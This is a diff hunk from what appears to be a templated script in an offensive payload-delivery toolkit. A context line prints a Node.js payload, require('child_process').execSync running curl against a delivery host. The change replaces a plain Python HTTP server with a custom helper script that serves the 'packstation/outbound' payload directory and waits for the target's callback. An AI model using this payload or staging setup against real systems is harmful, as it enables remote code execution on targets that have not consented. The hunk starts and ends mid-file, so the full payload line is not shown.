@@ -5,5 +5,5 @@ echo 'Deliver payload: require("child_process").execSync("curl http://<%=$(esh v
 echo '                       -----Linux------                         '; \
 echo 'Observe the callback below:                                     '; \
 echo '================================================================'; \
-python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
 
